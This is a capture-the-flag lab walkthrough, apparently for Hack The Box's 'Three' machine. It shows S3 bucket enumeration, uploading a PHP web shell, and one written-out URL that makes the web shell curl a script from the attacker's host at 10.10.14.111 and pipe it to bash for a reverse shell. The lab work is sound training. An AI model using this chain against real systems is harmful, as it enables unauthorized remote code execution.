#cloud #aws #reverseshell 

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/9b41165e-4ec8-4851-ae7e-98d7cbf17a0c)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/2c12aaf8-de9d-4755-b7d4-3360fa3b28e7)


Load the website and scroll down:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/089375b8-fa9d-42ab-9795-278db49f2db9)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/b0746627-88bd-43ad-bc46-f8da4613b967)


Add the IP + thetoppers.htb to the /etc/hosts file:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/cfc51877-33c9-4688-9492-9ab0efc6c8cf)

or

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/c6a70443-2d69-45b8-871e-93bb216f5b0f)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/81eeefcf-e734-4551-8acc-45403de06c4d)


![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/0da18fcd-560a-45bc-b56f-d9e79f563ee7)


## Subdomain Enumeration

Can use wfuzz, gobuster, or feroxbuster

### Using gobuster v3.6

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/07a04c9b-1b9b-42bf-a339-3bc635f35a1e)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/ac8dc4cb-b723-44d0-a9e8-19d20a022737)


s3.thetoppers.htb won't load so let's add it to the etc/hosts file again:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/7e113c38-8489-48a5-9c13-89e61fd3e253)


The webpage now loads:
![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/016f2119-094a-46c2-92d6-1a6c927c7a4a)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/2866fed5-8ec2-49bd-a96a-255f3b61affb)


Use awscli to interact with s3 buckets. To install awscli: 

	$ sudo apt install awscli

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/6b271a2d-621a-47f2-a95c-508a993aacde)


Configure aws:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/1e6177c1-c173-413f-97bf-8d618877c770)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/b104d36e-aa5f-4890-835f-c592d9986e61)
![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/f16d1b2a-6f64-495c-a0d6-a6359685b1d3)


List all s3 buckets:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/d5ed64f4-94ec-482d-9c10-ed3d1da28e5e)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/510ffd92-72d0-4891-8db1-b4315d424691)


List objects and common prefixes:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/6f758d2f-c3e7-46a4-af82-453174b21882)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/c80c9680-3d06-4338-a125-8102e31e9681)


## Code Execution

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/e3abb06b-a14a-4978-bd46-99e5386445bc)


Upload the shell to the website's s3 bucket:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/45814a2e-50e7-4158-9e23-c8c70cad9605)


Check to see that the shell.php file has been uploaded:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/90d1033f-b426-4cb0-adf7-7d2feda921ba)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/1d7f54f6-3607-40c5-8d3f-47f6677226b2)


### Attempt to get a reverse shell 
Save this payload to a new shell.sh file (change <YOUR_IP_ADDRESS>): 

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/19fdf39a-7bb3-440b-ba89-aa453ed80810)

Start a listener:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/5cffb85f-ad53-4eef-9276-9b8346ea14b5)

Start a server (in the directory the shell script is in):

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/1ba0165d-c9e7-485c-8048-6c4f733cfbc8)


Use curl to fetch the shell script & pipe it to bash for execution:

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/240cb2f2-a4da-4b1d-938d-450e42a5de59)


Inputting the following URL into the browser gets us a reverse shell:

	http://thetoppers.htb/shell.php?cmd=curl1%2010.10.14.111:8000/shell.sh|bash
 
![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/8fd98ef1-1106-46da-b978-81fd7af05728)


## Flag:
Reverse Shell achieved:
![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/3c55ead6-13b5-46f6-b65b-970654fcd720)

![image](https://github.com/Meowdypi/HackTheBox/assets/122643833/7e550894-d3c5-4fdc-8370-3960015f4363)

